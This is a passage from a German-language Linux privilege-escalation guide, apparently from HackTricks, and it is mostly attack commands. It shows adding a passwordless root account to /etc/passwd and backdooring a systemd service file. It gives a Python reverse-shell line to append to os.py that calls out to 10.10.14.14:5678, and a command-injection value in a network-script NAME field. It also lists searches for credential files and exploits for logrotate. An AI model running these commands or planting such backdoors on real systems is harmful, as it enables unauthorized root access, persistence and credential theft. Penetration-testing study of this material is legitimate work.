python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Fügen Sie dann den Benutzer `hacker` hinzu und fügen Sie das generierte Passwort hinzu.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sie können jetzt den `su` Befehl mit `hacker:hacker` verwenden.

Alternativ können Sie die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Sie könnten die aktuelle Sicherheit der Maschine beeinträchtigen.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` in `/etc/pwd.db` und `/etc/master.passwd`, außerdem wird `/etc/shadow` in `/etc/spwd.db` umbenannt.

Sie sollten überprüfen, ob Sie **in einige sensible Dateien schreiben können**. Zum Beispiel, können Sie in eine **Dienstkonfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Wenn die Maschine beispielsweise einen **tomcat**-Server ausführt und Sie die **Tomcat-Dienstkonfigurationsdatei in /etc/systemd/** ändern können, dann können Sie die Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ihr Backdoor wird beim nächsten Start von tomcat ausgeführt.

### Überprüfen Sie die Ordner

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich können Sie den letzten nicht lesen, aber versuchen Sie es)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Seltsame Orte/Besitzdateien
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Modifizierte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binärdateien im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-Dateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backups**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Lesen Sie den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er sucht nach **mehreren möglichen Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das Sie dafür verwenden können, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), das eine Open-Source-Anwendung ist, um viele auf einem lokalen Computer für Windows, Linux und Mac gespeicherte Passwörter abzurufen.

### Protokolle

Wenn Sie Protokolle lesen können, könnten Sie **interessante/vertrauliche Informationen darin finden**. Je seltsamer das Protokoll ist, desto interessanter wird es sein (wahrscheinlich).\
Außerdem können einige "**schlecht**" konfigurierte (backdoored?) **Audit-Protokolle** es Ihnen ermöglichen, **Passwörter** in Audit-Protokollen aufzuzeichnen, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um **Protokolle zu lesen, wird die Gruppe** [**adm**](interesting-groups-linux-pe/#adm-group) sehr hilfreich sein.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generische Creds Suche/Regex

Sie sollten auch nach Dateien suchen, die das Wort "**password**" in ihrem **Namen** oder im **Inhalt** enthalten, und auch nach IPs und E-Mails in Protokollen oder Hashes Regexps suchen.\
Ich werde hier nicht auflisten, wie man all dies macht, aber wenn Sie interessiert sind, können Sie die letzten Überprüfungen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) durchführt, überprüfen.

## Schreibbare Dateien

### Python-Bibliothek Hijacking

Wenn Sie wissen, **woher** ein Python-Skript ausgeführt wird und Sie **in diesen Ordner schreiben können** oder **Python-Bibliotheken modifizieren können**, können Sie die OS-Bibliothek modifizieren und einen Backdoor einfügen (wenn Sie dort schreiben können, wo das Python-Skript ausgeführt wird, kopieren und fügen Sie die os.py-Bibliothek ein).

Um **die Bibliothek zu backdooren**, fügen Sie einfach am Ende der os.py-Bibliothek die folgende Zeile hinzu (ändern Sie IP und PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-Ausnutzung

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **Schreibberechtigungen** für eine Protokolldatei oder deren übergeordnete Verzeichnisse, potenziell erhöhte Berechtigungen zu erlangen. Dies liegt daran, dass `logrotate`, das oft als **root** ausgeführt wird, manipuliert werden kann, um beliebige Dateien auszuführen, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu überprüfen, sondern auch in jedem Verzeichnis, in dem die Protokollrotation angewendet wird.

> [!NOTE]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter.

Detailliertere Informationen über die Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Sie können diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx-Logs),** also überprüfen Sie immer, ob Sie Protokolle ändern können, wer diese Protokolle verwaltet und ob Sie die Berechtigungen erhöhen können, indem Sie die Protokolle durch Symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Schwachstellenreferenz:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus irgendeinem Grund in der Lage ist, ein `ifcf-<whatever>`-Skript in _/etc/sysconfig/network-scripts_ **oder** ein bestehendes Skript **anzupassen**, dann ist Ihr **System kompromittiert**.

Netzwerkskripte, wie _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Sie werden jedoch \~sourced\~ auf Linux durch den Network Manager (dispatcher.d).

In meinem Fall wird das `NAME=`-Attribut in diesen Netzwerkskripten nicht korrekt behandelt. Wenn Sie **Leerzeichen im Namen haben, versucht das System, den Teil nach dem Leerzeichen auszuführen**. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd und rc.d**

Das Verzeichnis `/etc/init.d` ist die Heimat von **Skripten** für System V init (SysVinit), dem **klassischen Linux-Dienstverwaltungssystem**. Es enthält Skripte zum `Starten`, `Stoppen`, `Neustarten` und manchmal `Neuladen` von Diensten. Diese können direkt oder über symbolische Links in `/etc/rc?.d/` ausgeführt werden. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Andererseits ist `/etc/init` mit **Upstart** verbunden, einer neueren **Dienstverwaltung**, die von Ubuntu eingeführt wurde und Konfigurationsdateien für Dienstverwaltungsaufgaben verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte weiterhin zusammen mit Upstart-Konfigurationen aufgrund einer Kompatibilitätsschicht in Upstart verwendet.

**systemd** tritt als modernes Initialisierungs- und Dienstverwaltungssystem auf und bietet fortschrittliche Funktionen wie das Starten von Daemons nach Bedarf, Automount-Verwaltung und Systemzustands-Snapshots. Es organisiert Dateien in `/usr/lib/systemd/` für Verteilungspakete und `/etc/systemd/system/` für Administratoränderungen, was den Systemverwaltungsprozess optimiert.

## Weitere Tricks

### NFS Privilegieneskalation

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ausbrechen aus eingeschränkten Shells

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## Kernel-Sicherheitsmaßnahmen

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Weitere Hilfe

[Statische Impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc-Tools

### **Bestes Tool zur Suche nach lokalen Privilegieneskalationsvektoren in Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t Option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeriert Kernel-Schwachstellen in Linux und MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physischer Zugang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zusammenstellung weiterer Skripte**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referenzen

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
